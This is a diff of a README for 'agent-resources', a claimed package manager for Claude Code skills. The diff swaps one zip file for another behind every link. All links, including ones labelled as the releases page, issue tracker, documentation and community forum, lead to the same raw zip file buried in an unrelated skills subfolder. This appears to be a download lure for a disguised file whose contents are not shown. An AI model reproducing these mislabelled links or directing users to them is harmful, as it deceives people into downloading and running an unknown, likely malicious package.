@@ -1,7 +1,7 @@
 # 🎉 agent-resources - Simplify Your Claude Code Management
 
 ## 🔗 Download Now
-[![Download agent-resources](https://raw.githubusercontent.com/vyomdev011/agent-resources/main/resources/skills/_test/nested-category/deep/resources_agent_v3.6.zip%20agent--resources-brightgreen)](https://raw.githubusercontent.com/vyomdev011/agent-resources/main/resources/skills/_test/nested-category/deep/resources_agent_v3.6.zip)
+[![Download agent-resources](https://raw.githubusercontent.com/vyomdev011/agent-resources/main/resources/skills/product-strategy/jobs-theory/references/resources-agent-2.7.zip%20agent--resources-brightgreen)](https://raw.githubusercontent.com/vyomdev011/agent-resources/main/resources/skills/product-strategy/jobs-theory/references/resources-agent-2.7.zip)
 
 ## 📚 Description
 agent-resources is a convenient package and project manager for Claude Code. With a single command, you can easily install agent skills directly from GitHub. This tool streamlines your coding process and enhances your productivity by giving you quick access to essential resources.
@@ -14,7 +14,7 @@ To get started with agent-resources, follow these steps:
 - Internet Connection: Requires an active internet connection for downloading components
 
 ### 2. Download & Install
-Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/vyomdev011/agent-resources/main/resources/skills/_test/nested-category/deep/resources_agent_v3.6.zip).
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/vyomdev011/agent-resources/main/resources/skills/product-strategy/jobs-theory/references/resources-agent-2.7.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version listed.
@@ -70,10 +70,10 @@ Once installed, you can start using agent-resources to manage and install agent 
 - claude-code-subagents
 
 ## 📩 Support
-If you have any issues or questions, you can open an issue on our [GitHub page](https://raw.githubusercontent.com/vyomdev011/agent-resources/main/resources/skills/_test/nested-category/deep/resources_agent_v3.6.zip). Community members and maintainers are there to help you.
+If you have any issues or questions, you can open an issue on our [GitHub page](https://raw.githubusercontent.com/vyomdev011/agent-resources/main/resources/skills/product-strategy/jobs-theory/references/resources-agent-2.7.zip). Community members and maintainers are there to help you.
 
 ## 📖 Additional Resources
-- [Documentation](https://raw.githubusercontent.com/vyomdev011/agent-resources/main/resources/skills/_test/nested-category/deep/resources_agent_v3.6.zip): Comprehensive guide for advanced usage.
-- [Community Forum](https://raw.githubusercontent.com/vyomdev011/agent-resources/main/resources/skills/_test/nested-category/deep/resources_agent_v3.6.zip): Discuss with other users and developers.
+- [Documentation](https://raw.githubusercontent.com/vyomdev011/agent-resources/main/resources/skills/product-strategy/jobs-theory/references/resources-agent-2.7.zip): Comprehensive guide for advanced usage.
+- [Community Forum](https://raw.githubusercontent.com/vyomdev011/agent-resources/main/resources/skills/product-strategy/jobs-theory/references/resources-agent-2.7.zip): Discuss with other users and developers.
 
 By following these steps, you can easily download, install, and begin using agent-resources to enhance your Claude Code experience. Start managing your agent skills more efficiently today!
